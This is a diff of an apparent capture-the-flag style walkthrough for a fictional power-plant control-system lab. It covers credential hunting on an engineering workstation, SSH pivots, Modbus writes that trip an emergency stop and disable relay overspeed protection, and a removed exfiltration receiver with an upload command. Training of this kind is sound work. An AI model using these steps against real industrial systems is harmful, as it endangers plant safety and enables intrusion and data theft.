@@ -2,7 +2,7 @@
 
 ## Entry
 
-SSH on port 22 as `engineer`. The password is in the 2019 network map buried in
+Via SSH on port 22 as `engineer`. The password is in the 2019 network map buried in
 the backup archive on hex-legacy-1, or in the engineering notes on any lateral
 pivot that has already visited the operational zone.
 
@@ -21,44 +21,46 @@ have a shell there, the key pivot works without a password.
 The first question on a dual-homed host is always: what does it touch?
 
 ```powershell
-whoami
+PS C:\Users\engineer> whoami
 ```
 
 Returns `ot.local\engineer`. Standard domain account.
 
 ```powershell
-hostname
+PS C:\Users\engineer> hostname
 ```
 
 Returns `ENG-WS01`.
 
 ```powershell
-ipconfig
+PS C:\Users\engineer> ipconfig
 ```
 
-Two NICs. `eth1` at `10.10.2.30` (operational zone). `eth2` at `10.10.3.100`
-(control zone). This box has a direct path to every PLC, relay, and HMI on the
-control network. That is the find.
+Two NICs. `Ethernet0` at `10.10.3.100` (control zone). `Ethernet1` at
+`10.10.2.30` (operational zone). This box has a direct path to every PLC, relay,
+and HMI on the control network. That is the find.
 
 ```powershell
-route print
+PS C:\Users\engineer> route print
 ```
 
 Default gateway via `10.10.2.202`. The control-zone subnet (`10.10.3.0/24`) is
-directly attached on `eth2`, no routing hop required.
+directly attached on `Ethernet0`, no routing hop required. The Interface List at
+the top of the output shows the real MAC addresses for both NICs.
 
 ```powershell
-netstat -ano
+PS C:\Users\engineer> netstat -ano
 ```
 
-The cron-driven poll process connects to `10.10.3.21:502` (PLC Modbus) and POSTs
-to `10.10.2.10:8080` (historian ingest) roughly every minute. Both connections
-show up in the active socket list.
+Shows SSH listening on 22 and the current session as ESTABLISHED. The
+cron-driven poll runs every minute but connects, reads, and closes in well under
+a second, so its Modbus and HTTP connections are gone before a manual netstat
+has any chance to catch them.
 
 ## Credential hunting
 
 ```powershell
-cat config\plc-access.conf
+PS C:\Users\engineer> cat config\plc-access.conf
 ```
 
 The entire OT device inventory: IP, port, protocol, unit ID, and operational
@@ -67,16 +69,17 @@ Stibbons in 2001 and updated ever since. The relay web credentials
 (`admin/relay1234`) are in the notes column.
 
 ```powershell
-cat Documents\engineering_notes.txt
+PS C:\Users\engineer> cat Documents\engineering_notes.txt
 ```
 
 Consolidates credentials across multiple systems: historian DB password
 (`Historian2015`), SCADA web login (`admin/admin`) and SSH (`scada_admin /
-W1nd0ws@2016`), historian SSH (`hist_admin / Historian2015`), and HMI access.
-The author's note "it's fine" appears next to the historian password.
+W1nd0ws@2016`), historian SSH (`hist_admin / Historian2015`), and the HMI web
+at `http://10.10.3.10:1881/` which takes no login. The author's note "it's fine"
+appears next to the historian password.
 
 ```powershell
-cat Projects\Firmware\README.txt
+PS C:\Users\engineer> cat Projects\Firmware\README.txt
 ```
 
 PLC admin credentials in plain text: `admin / turbineadmin`. Listed under
@@ -84,11 +87,11 @@ PLC admin credentials in plain text: `admin / turbineadmin`. Listed under
 credentials.
 
 ```powershell
-cat Desktop\update_plc_firmware.ps1
+PS C:\Users\engineer> cat Desktop\update_plc_firmware.ps1
 ```
 
 ```powershell
-cat Tools\send_alarm.ps1
+PS C:\Users\engineer> cat Tools\send_alarm.ps1
 ```
 
 The alarm relay script carries the SMTP password (`plantmail123`) in plain text.
@@ -96,7 +99,7 @@ The same credential is in `C:\SCADA\Config\scada.ini` on the SCADA server and
 in the SCADA `/config` endpoint.
 
 ```powershell
-cat Tools\poll_and_ingest.py
+PS C:\Users\engineer> cat Tools\poll_and_ingest.py
 ```
 
 The historian ingest credentials (`hist_read / history2017`) are hardcoded here.
@@ -106,44 +109,18 @@ endpoint for read access.
 ## Backup archive
 
 ```powershell
-dir backups\
+PS C:\Users\engineer> dir backups\
 ```
 
-One file: `PLC_Backup_2019.tar.gz`. Start a receiver on wizzards-retreat and push from
-this shell:
-
-From wizzards-retreat (before logging in here):
-
-```bash
-mkdir -p /tmp/loot
-python3 -c "
-from http.server import HTTPServer, BaseHTTPRequestHandler
-class R(BaseHTTPRequestHandler):
-    def do_POST(self):
-        n = int(self.headers.get('Content-Length', 0))
-        open('/tmp/loot/' + self.path.strip('/'), 'wb').write(self.rfile.read(n))
-        self.send_response(200); self.end_headers()
-    def log_message(self, *a): pass
-HTTPServer(('10.10.2.3', 9999), R).serve_forever()
-" &
-```
-
-From this shell:
-
-```powershell
-iwr -Method POST -Uri http://10.10.2.3:9999/PLC_Backup_2019.tar.gz -InFile backups\PLC_Backup_2019.tar.gz
-```
-
-Full exfil chain to unseen-gate: `books2/eng-ws-exfil.md`.
-
-Inside: `plc-access-2019.conf` with the 2019 pre-audit credential set, and
-`network_map_2019.txt`, the most complete device map in the lab. The map names
-every operational and control zone host with its IP, username, and password.
+One file: `PLC_Backup_2019.tar.gz`. Inside: `plc-access-2019.conf` with the
+2019 pre-audit credential set, and `network_map_2019.txt`, the most complete
+device map in the lab. The map names every operational and control zone host
+with its IP, username, and password.
 
 ## PLC project files
 
 ```powershell
-cat Projects\PLC\turbine_controller.project
+PS C:\Users\engineer> cat Projects\PLC\turbine_controller.project
 ```
 
 The exported PLC project file. Contains the full register map (coil 0 is the
@@ -152,7 +129,7 @@ Also documents that Modbus TCP has no authentication: "The network IS the access
 control."
 
 ```powershell
-cat Projects\RelayConfigs\relay_a_2019.txt
+PS C:\Users\engineer> cat Projects\RelayConfigs\relay_a_2019.txt
 ```
 
 Relay A protection thresholds in the Modbus holding register map. HR[0] is
@@ -163,39 +140,37 @@ conditions to persist without a trip.
 ## PSReadLine history
 
 ```powershell
-cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users\engineer> cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-Shows recent sessions: Modbus reads against the turbine PLC, historian queries,
-SCADA access, and SSH sessions to both the HMI and the SCADA server. The
-command history confirms which hosts were recently active and what the engineer
-was looking at.
+Shows recent sessions: Modbus reads against the turbine PLC, historian and SCADA
+queries via curl, an SSH session to the SCADA server, and an nmap of
+10.10.3.0/24. The command history confirms which hosts were recently active and
+what the engineer was doing.
 
 ## Modbus access
 
-The Python tools are ready to use. The venv is on PATH.
-
 ```powershell
-python Tools\modbus_read.py 10.10.3.21 502 input 0 5
+PS C:\Users\engineer> python Tools\modbus_read.py 10.10.3.21 502 input 0 5
 ```
 
 Live turbine input registers: RPM, temperature, pressure, voltage, current.
 
 ```powershell
-python Tools\modbus_read.py 10.10.3.21 502 holding 0 4
+PS C:\Users\engineer> python Tools\modbus_read.py 10.10.3.21 502 holding 0 4
 ```
 
 Governor setpoint, fuel valve command, cooling pump speed, overcurrent threshold.
 
 ```powershell
-python Tools\modbus_read.py 10.10.3.31 502 holding 0 3
+PS C:\Users\engineer> python Tools\modbus_read.py 10.10.3.31 502 holding 0 3
 ```
 
 Relay A protection thresholds. Write HR[1]=0 to zero the overspeed threshold
 and prevent the relay from acting on an overspeed condition.
 
 ```powershell
-python Tools\modbus_write.py 10.10.3.21 502 coil 0 1
+PS C:\Users\engineer> python Tools\modbus_write.py 10.10.3.21 502 coil 0 1
 ```
 
 Emergency stop. Writes coil 0 high. The runbook note says: "DO NOT write coil 0
@@ -208,16 +183,17 @@ covered by any official runbook. They appear in PSReadLine history, indicating
 regular use by the engineering team.
 
 ```powershell
-python Tools\mqtt_check.py
+PS C:\Users\engineer> python Tools\mqtt_check.py
 ```
 
 Subscribes to `uupl/turbine/telemetry` on the internal broker at `10.10.3.60`.
-Prints a live JSON stream: RPM, voltage, current, frequency, valve position, and
-alarm flags as the PLC publishes them. No credentials required; the broker allows
-anonymous connections.
+Prints a live JSON stream: rpm, temp_c, pressure, voltage_a, voltage_b,
+current_a, current_b, freq_x10, power_kw, and estop as the PLC publishes them
+every five seconds. No credentials required; the broker allows anonymous
+connections.
 
 ```powershell
-python Tools\mqtt_bridge.py
+PS C:\Users\engineer> python Tools\mqtt_bridge.py
 ```
 
 Bridges `uupl/turbine/telemetry` from the internal broker (`10.10.3.60`) to
@@ -232,37 +208,143 @@ connections.
 The SSH known_hosts file lists every host the workstation has connected to.
 
 ```powershell
-cat .ssh\known_hosts
+PS C:\Users\engineer> cat .ssh\known_hosts
 ```
 
-From here, SSH reaches operational and control-zone hosts without a gateway hop:
+Three entries: the turbine PLC at 10.10.3.21, the process historian at
+10.10.2.10, and the SCADA server at 10.10.2.20. A comment notes that the relay
+IEDs were never added (ticket still open). SSH reaches both operational-network
+and control-network hosts directly from here:
 
 ```
-ssh hist_admin@10.10.2.10
-ssh scada_admin@10.10.2.20
+PS C:\Users\engineer> ssh hist_admin@10.10.2.10
 ```
 
-The HMI (`10.10.3.10`) has no SSH. It runs FUXA on port 1881; anonymous read is
-active and no login is required to pull the project configuration.
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
 
-All credentials are in `engineering_notes.txt`. The SSH key in `.ssh\id_rsa` may
-also be accepted on control-zone hosts that were provisioned with the engineer's
-public key.
+*******************************************************************************
+*                                                                             *
+*   Unseen University Power & Light Co.                                       *
+*   HIST-SRV01, Process Historian Server (Windows Server 2019)              *
+*                                                                             *
+*   This system stores all plant time-series data since 1997.                *
+*   Authorised personnel only. Contact: Ponder Stibbons (ext 201).           *
+*                                                                             *
+*******************************************************************************
+
+PS C:\Users\hist_admin> exit
+```
+
+HIST-SRV01 answers. Windows Server 2019 banner, store open since 1997.
+
+```
+PS C:\Users\engineer> ssh scada_admin@10.10.2.20
+```
+
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+*******************************************************************************
+*                                                                             *
+*   Unseen University Power & Light Co.                                       *
+*   SCADA-SRV01, Distribution SCADA Server (Windows Server 2016)            *
+*                                                                             *
+*   Authorised UU P&L personnel only. Usage is monitored and logged.         *
+*   Contact: Ponder Stibbons (ext 201) for access requests.                  *
+*                                                                             *
+*******************************************************************************
+
+PS C:\Users\scada_admin> exit
+```
+
+SCADA-SRV01 answers. Windows Server 2016. The SSH key in `.ssh\id_rsa` may also
+work on control-network hosts that were provisioned at commissioning.
 
 ## Poll log
 
 ```powershell
-cat plc_poll.log
+PS C:\Users\engineer> cat plc_poll.log
 ```
 
-The cron-driven ingest process logs each poll cycle. The log confirms PLC is
-reachable and gives a live view of turbine state (RPM, temperature, pressure)
-timestamped to the minute. On a real engagement, a log with hundreds of entries
-at :00 of every minute is the first confirmation that the workstation has been
-running plant operations continuously.
+```
+poll_and_ingest: rpm=2997 temp=144 press=84 volt_a=229 curr_a=75 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2934 temp=178 press=83 volt_a=226 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2946 temp=175 press=84 volt_a=227 curr_a=74 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2947 temp=171 press=84 volt_a=227 curr_a=74 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2949 temp=176 press=84 volt_a=226 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: skipped cycle
+poll_and_ingest: rpm=2950 temp=177 press=83 volt_a=223 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2939 temp=174 press=84 volt_a=225 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2940 temp=174 press=84 volt_a=225 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2958 temp=176 press=83 volt_a=228 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: skipped cycle
+poll_and_ingest: rpm=2925 temp=174 press=83 volt_a=222 curr_a=72 [ok, 9/9 ingested]
+[snip]
+poll_and_ingest: rpm=2939 temp=173 press=84 volt_a=225 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: rpm=2971 temp=174 press=84 volt_a=230 curr_a=74 [ok, 9/9 ingested]
+poll_and_ingest: skipped cycle
+poll_and_ingest: rpm=2950 temp=181 press=84 volt_a=226 curr_a=73 [ok, 9/9 ingested]
+poll_and_ingest: rpm=0 temp=20 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=1 temp=19 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=16 temp=22 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: skipped cycle
+poll_and_ingest: rpm=7 temp=19 press=0 volt_a=1 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=0 temp=18 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=19 temp=18 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=23 temp=18 press=1 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=6 temp=19 press=0 volt_a=1 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=0 temp=18 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+poll_and_ingest: rpm=17 temp=21 press=0 volt_a=0 curr_a=0 [ok, 9/9 ingested]
+```
 
-## To investigate
+Each line is one poll cycle: RPM, temperature, pressure, voltage, and current,
+plus the ingest count. `skipped cycle` entries appear roughly one in twenty as
+jitter. A long run of steady readings followed by rpm=0 is the emergency stop
+written earlier in this session.
 
-- `schtasks /query` lists scheduled tasks. The poll cron is a Linux crontab,
-  not a Windows scheduled task, so the facade's `schtasks` output does not
-  reflect it.
+```powershell
+PS C:\Users\engineer> schtasks /query
+```
+
+```
+TaskName                         Schedule 
+--------                         -------- 
+PLC-Poll                         Per Minute
+```
+
+Lists the scheduled task registered to the engineer account. `PLC-Poll` appears
+here; it is the cron entry driving `poll_and_ingest.py`.
+
+## What you can know now
+
+Access:
+- Shell on ENG-WS01 as `engineer` at 10.10.2.30
+- SSH to HIST-SRV01 as `hist_admin` at 10.10.2.10
+- SSH to SCADA-SRV01 as `scada_admin` at 10.10.2.20
+
+Network:
+- 10.10.3.0/24 (control network) is directly attached on Ethernet0 (10.10.3.100), no gateway hop
+- PLC at 10.10.3.21, relays A/B at 10.10.3.31/32, HMI at 10.10.3.10, actuators at 10.10.3.51-54, MQTT broker at 10.10.3.60
+- Default gateway 10.10.2.202
+
+Credentials:
+- `engineer / spanner99` (ENG-WS01 SSH)
+- `hist_read / history2017` (historian ingest and report API)
+- `hist_admin / Historian2015` (historian SSH)
+- `historian / Historian2015` (historian DB)
+- `admin / admin` (SCADA web)
+- `scada_admin / W1nd0ws@2016` (SCADA SSH)
+- `admin / turbineadmin` (PLC admin)
+- `admin / relay1234` (relay web interfaces, both feeders)
+- `alarms@uupl.am / plantmail123` (SMTP alarm relay)
+- HMI at `http://10.10.3.10:1881/`, no login required
+
+OT reach:
+- Modbus TCP write to any device on 10.10.3.0/24, no authentication
+- PLC emergency stop: write coil 0 = 1 on 10.10.3.21
+- Relay trip thresholds writable: HR[0-2] on 10.10.3.31 and 10.10.3.32
+- MQTT broker at 10.10.3.60 allows anonymous subscribe and publish
+- Live telemetry bridgeable to the DMZ broker at 10.10.5.12 via `mqtt_bridge.py`
